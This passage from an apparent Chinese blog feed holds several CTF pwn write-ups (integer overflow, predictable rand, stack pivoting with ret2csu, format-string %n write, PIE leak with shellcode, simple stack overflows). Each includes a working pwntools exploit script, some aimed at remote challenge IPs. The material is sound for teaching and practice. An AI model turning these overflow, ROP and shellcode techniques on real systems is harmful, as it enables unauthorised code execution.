punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x04008DA</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得flag：<br><img src="/images/Mary-Morton/7.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>int_overflow</title>
      <link href="/2022/12/31/int-overflow/"/>
      <url>/2022/12/31/int-overflow/</url>
      
        <content type="html"><![CDATA[<h2 id="int-overflow-wp"><a href="#int-overflow-wp" class="headerlink" title="int_overflow  wp"></a>int_overflow  wp</h2><p>这题涉及到了整数溢出漏洞，值得写一篇博客。<br>先checksec一下：<br><img src="/images/int-overflow/1.png"><br>只开了NX保护机制<br>拖入IDA查看：<br><img src="/images/int-overflow/2.png"><br>主函数里没有什么可以利用的<br>打开login（）函数：<br><img src="/images/int-overflow/3.png"><br>有read函数但是无法溢出……打开check_passwd函数这里涉及到一个知识点unsigned_int8定义的是一个无符号型8位整数<br>具体解释如下：</p><pre class="line-numbers language-none"><code class="language-none">int8取值范围是-128 - 127unsigned int8 0-255Int16 意思是16位整数(16bit integer)，相当于short 占2个字节 -32768 ~ 32767Int32 意思是32位整数(32bit integer), 相当于 int 占4个字节 -2147483648 ~ 2147483647Int64 意思是64位整数(64bit interger), 相当于 long long 占8个字节 -9223372036854775808 ~ 9223372036854775807<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里涉及到一个整数溢出：strlen函数读取buf的字符长度以int类型返回是32位字节的，而将它赋给了v3如果返回值大于255则会发生整数溢出，将高位字节截断保留低位字节<br>我们看到if函数的else部分是我们可以利用的，有个危险函数strcpy（）可以复制任意长度字符串，这里可以将s的字符串复制到dest数组并发生溢出<br>那思路就拟好了先让v3在4~8区间内判断到else区间执行然后该怎么覆盖怎么覆盖<br>dest的栈空间如下：<br><img src="/images/int-overflow/4.png"><br>上exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"223.112.5.156"</span><span class="token punctuation">,</span><span class="token number">63036</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x0804868b</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">232</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"username:\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"zjh"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"passwd:\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得flag：<br><img src="/images/int-overflow/5.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>guess_num</title>
      <link href="/2022/12/28/guess-num/"/>
      <url>/2022/12/28/guess-num/</url>
      
        <content type="html"><![CDATA[<h2 id="guess-num-wp"><a href="#guess-num-wp" class="headerlink" title="guess_num wp"></a>guess_num wp</h2><p>为什么写这题呢？感觉这题很有代表性（学到的东西挺多），以后很多的问题可以提前解决，所以写一篇博客记录一下。<br>先checksec一下：<br><img src="/images/guess-num/1.png"><br>吓死本菜鸡了！竟然三个保护机制全开了！<br>我们拖入IDA查看：<br><img src="/images/guess-num/2.png"><br>代码还有点小长……<del>当场决定放弃</del>咳咳，这题着实吓到我了，看一下有没有威胁函数，发现gets函数可以无限输入<br>硬着头皮查看每个函数，发现：<br><img src="/images/guess-num/03.png"><br>sub_C3E函数里可以直接抓取flag，回去看一眼这个函数的位置，在最底部，中间有个循环判断而且有个exit（0）想要运行sub_C3E必须要绕过他（从判断脱离出来）<br>但我又不知道srand()函数和rand()函数有什么作用……去网上查一查发现这两个函数要配合使用srand()函数为rand()函数初始化，srand()里的参数不同对应rand()的产生的随机数也不同<br>但只要srand()里的数是固定的，那么rand产生的随机数也是固定的。<br>那么就要自己写个程序：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> key<span class="token punctuation">,</span>i<span class="token punctuation">;</span><span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>key<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行去查看它产生的随机数，这里我们选择0<del>（方便）</del><br>又涉及到一个冷知识同一串程序在linux和windows中产生的随机数是不一样的！<del>好吧，摊牌了我看了wp，哈哈</del>咳咳，<br>结果把cpp文件拖到虚拟机里运行又出了问题……<br><img src="/images/guess-num/04.png"><br>这里要改一下进行以下操作：</p><pre class="line-numbers language-none"><code class="language-none">1.  cc c.cpp（原来的名字） -o 1c（想改的文件名）2.  .&#x2F;1c  #运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>我原来的文件名是c.cpp经过上述操作改成了1c（就可以用了，我也不知道为什么）<br>运行一下：<br><img src="/images/guess-num/5.png"><br>把数据记下来。<br>上exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"223.112.5.156"</span><span class="token punctuation">,</span><span class="token number">60001</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your name:"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>rand<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token builtin">int</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your guess number:"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rand<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得flag：<br><img src="/images/guess-num/6.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈转移原理与通用garget的使用</title>
      <link href="/2022/12/28/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/12/28/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="栈转移原理与通用rop的使用"><a href="#栈转移原理与通用rop的使用" class="headerlink" title="栈转移原理与通用rop的使用"></a>栈转移原理与通用rop的使用</h1><p>此题下载链接：<br><a href="/download/advanced">点击下载</a><br>这里我们通过一题pwn题边解边说：<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/1.png"><br>可以看到，这题讲解示范没有开任何保护。<br>拖入ida查看：<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/2.png"><br>虽然打印出来了execv的地址和system的地址，但不知道为什么和~~ 实际差挺多的  ~~……如下：<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/3.png"><br>查看vul函数发现有溢出点但是字节有限只能溢出24个字节，而此题没有现成的system或execv函数可用，直接溢出并不现实<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/4.png"></p><h3 id="栈转移原理"><a href="#栈转移原理" class="headerlink" title="栈转移原理"></a>栈转移原理</h3><p>现在介绍一个新的方法：<strong>栈转移</strong><br>当碰到这种题目时，因为溢出字节不够，要转移到别的栈段上运行已准备好的rop<br>栈是由rbp和rsp决定的，尤其是后者rsp在哪，栈就在哪。因此，我们只需要想办法把rsp指针转移到我们需要的地方即可。而想要改变rsp的值，可以先通过改变rbp的值，再把rbp的值传递给rsp就可以达到栈转移到目的。<br>实际方法用leave ret指令可以做到<br>我们知道leave指令相当于</p><pre class="line-numbers language-none"><code class="language-none">move rsp, rbppop  rbp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ret指令相当于：</p><pre class="line-numbers language-none"><code class="language-none">pop rip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因此将rbp的值先覆盖成目标地址，利用函数自带的leave指令先将rbp控制，接下另一段leave ret的garget的地址就可以实现rsp的控制实现栈转移，至于转移后rbp的值并不重要<br>leave;ret;地址：<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/5.png"></p><h3 id="通用garget原理"><a href="#通用garget原理" class="headerlink" title="通用garget原理"></a>通用garget原理</h3><p>已经把栈转移到了grobe_buf去了，接下来设置该区域的rop链，我们用通用garget<br>我们点开_libc_csu_init这个函数<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/7.png"><br>可以发现这里的garget是不是很齐全，只要调用了这里几乎哪里都能call，这里分为两个garget分别记下地址<br>这里说一下怎么查看execv函数got表地址：<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/9.png"><br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/10.png"><br>接下来上exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./advanced'</span><span class="token punctuation">)</span>payload1<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">80</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x404080</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4011fb</span><span class="token punctuation">)</span><span class="token comment">#leave ret的地址</span>payload2<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token comment">#将/bin/sh\x00输入grobe_buf中</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x40133a</span><span class="token punctuation">)</span><span class="token comment">#通用garget pop部分</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#rbx</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#rbp</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x404080</span><span class="token punctuation">)</span><span class="token comment">#将/bin/sh的地址给r12，r12后会给rdi</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#r13</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#r14 这两个值看调用函数原型的要求来定</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x403ff8</span><span class="token punctuation">)</span><span class="token comment">#execv函数在got表的真实地址</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x401320</span><span class="token punctuation">)</span><span class="token comment">#通用garget call部分</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'global:'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结束战斗：<del>（由于是本地做题没有flag）</del><br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/11.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn原理讲解 pwn_write_up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CGfsb_wp</title>
      <link href="/2022/12/27/CGfsb-wp/"/>
      <url>/2022/12/27/CGfsb-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h2><p>先将其在终端checksec一下：<br><img src="/images/CGfsb-wp/1.png"><br>32位程序，开了NX(堆栈不可执行)以及CANNARY(栈保护)，但这题开cannary真没感觉有什么用，又不是用栈溢出，奇怪……<br>拖入IDA查看代码<br><img src="/images/CGfsb-wp/2.png"><br>有两个输入点，这里重点看这个printf(s);这个是C语言学习中没涉及到的，等等会细说<br>观察有个system(“cat flag”);可以直接抓取flag于是思路清晰只要然pwnme&#x3D;8就可以了，双击pwnme发现他存储在bss段，我们要如何才能用栈段的数据写到它那去呢？<br>这里就涉及到一个漏洞：格式化字符串漏洞<br>一般上格式是</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span>“<span class="token operator">%</span>s”，s<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但变成了</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">%d - 十进制 - 输出十进制整数%s - 字符串 - 从内存中读取字符串%x - 十六进制 - 输出十六进制数%c - 字符 - 输出字符%p - 指针 - 指针地址%n - 到目前为止所写的字符数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>特别注意%n，它的功能是将%n之前打印出来的字符个数，赋值给一个变量比如：<br><img src="/images/CGfsb-wp/3.png"><br>a的值被改变了<br>也就是说他在某种特定环境下可以作为一个scanf来使用（不懂这个打死都别想做出来）<br>我们需要将pwnme的地址输入到s的空间去，在合适的位置上加一个%n，使其与我们输入的地址对应，从而造成漏洞利用<br>所以接下来的问题变成了如何让他们对应起来<br>对其运行输入<br><img src="/images/CGfsb-wp/4.png"><br>发现偏移量为10<br>上exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">56143</span><span class="token punctuation">)</span>pwnme<span class="token operator">=</span>p32<span class="token punctuation">(</span><span class="token number">0x0804A068</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>pwnme<span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span><span class="token string">b'%10$n'</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"zjh"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please:\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>get shell!拿到flag<br><img src="/images/CGfsb-wp/5.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>repeater_wp</title>
      <link href="/2022/12/26/repeater-wp/"/>
      <url>/2022/12/26/repeater-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="repeater"><a href="#repeater" class="headerlink" title="repeater"></a>repeater</h2><p>遇到的第一题开PIE保护机制的pwn题，写一篇记录一下<br>PIE保护机制就是使程序的基地址随机化让我们无法进行shellcode的注入、rop链的搭建等，因此需要解题的第一件事就是找出程序的基地址，目标明确！<br>首先先将其checksec一下：<br><img src="/images/repeater-wp/1.png"><br>发现此题只开了PIE保护，NX保护机制没开可以实现shellcode注入，因此目标：找出基地址，并实现shellcode注入获取shell。<br>将其拖入IDA进行查看：<br><img src="/images/repeater-wp/2.png"><br>实际地址&#x3D;基地址+偏移地址，想要实际地址要知道基地址和偏移地址。在图中告诉我们s的偏移地址为rbp-30h，v5的偏移地址为rbp-10h二者相差20h（32字节），<br>read函数以s的地址为底可以溢出64个字节可以覆盖至返回地址！<br>对于sub_982（byte_202040，48ull）函数的功能单看应该是看不出来的但我们在终端中可以测试这个函数的功能<br><img src="/images/repeater-wp/3.png"><br>我们发现这个函数是进行输入名字的，通过浅浅分析它把名字放到了202040这个地址，可以将shellcode注入这里。<br>main函数偏移地址可以直接查看：<br><img src="/images/repeater-wp/4.png"><br>所以整体思路用exp来表示：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'61.147.171.105'</span><span class="token punctuation">,</span><span class="token number">64894</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>shellcode<span class="token operator">=</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name :'</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">3281697</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"input :"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"you :\n0x"</span><span class="token punctuation">)</span>main_addr<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token string">'12'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>b_addr<span class="token operator">=</span>main_addr<span class="token operator">-</span><span class="token number">0xa33</span>shellcode_addr<span class="token operator">=</span>b_addr<span class="token operator">+</span><span class="token number">0x202040</span>payload2<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">16</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"input :"</span><span class="token punctuation">,</span>payload2<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得shell。</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hello_pwn</title>
      <link href="/2022/12/25/hello-pwn/"/>
      <url>/2022/12/25/hello-pwn/</url>
      
        <content type="html"><![CDATA[<h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h2><p>先将其在终端中checksec下：<br><img src="/images/hello_pwn/1.png"><br>只开了NX保护，推断是个栈溢出问题。<br>拖进IDA查看：<br><img src="/images/hello_pwn/2.png"><br>发现有个read函数可溢出16个字节。<br>对其中函数分析发现sub_400686()函数可直接调用system函数抓取flag：<br><img src="/images/hello_pwn/3.png"><br>目标明确！要调用sub_400686()，于是我们回头查看条件<br><img src="/images/hello_pwn/2.png"><br>发现只需让dword_60106C &#x3D;&#x3D; 1853186401即可<br>查看栈帧：<br><img src="/images/hello_pwn/4.png"><br>发现非常凑巧的unk_601068离dword_60106c只差4个字节栈，溢出完全够用<br>上exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./hello_pwn'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1853186401</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'bof'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/hello_pwn/5.png"><br>成功获得shell，由于是在本地下载做的所以没有flag的文件，但在远程会有这个文件，也算是成功了</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅尝pwn题：pwnstack</title>
      <link href="/2022/12/24/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/"/>
      <url>/2022/12/24/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/</url>
      
        <content type="html"><![CDATA[<h2 id="pwnstack-wp"><a href="#pwnstack-wp" class="headerlink" title="pwnstack wp"></a>pwnstack wp</h2><p>这题pwn是我看wp写出来的，一个晚上的琢磨感觉网上的wp还是不够简洁，于是乎我自己来总结一下：<br>首先从网站上下载压缩包解压后放至自己虚拟机的文件夹中；<br>发现它是个64位二进制文件：<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/1.png"><br>对其进行checksec下如下图：<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/2.png"><br>发现只有NX保护打开。<br>在物理机上将它拖进IDA中分析：<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/3.png"><br>对其中的函数双击点进去，发现vul函数中有read函数可读取177个字节，而我们定义的buf只有160个字节，很明显是个栈溢出题目。<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/4.png"><br>然后我们在这列中找到了后门函数：backdoor<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/5.png"><br>进去看发现它可以直接调用&#x2F;bin&#x2F;sh获得shell：<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/6.png"><br>接下来就是编写脚本了，因为要覆盖到返回地址只要将buf区填满和rbp指针覆盖共需要168个字节于是我们填充168个a，后面返回地址则覆盖为backdoor的地址即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn2'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">168</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x400762</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取shell</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwntools的基本语法</title>
      <link href="/2022/12/24/pwntools%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
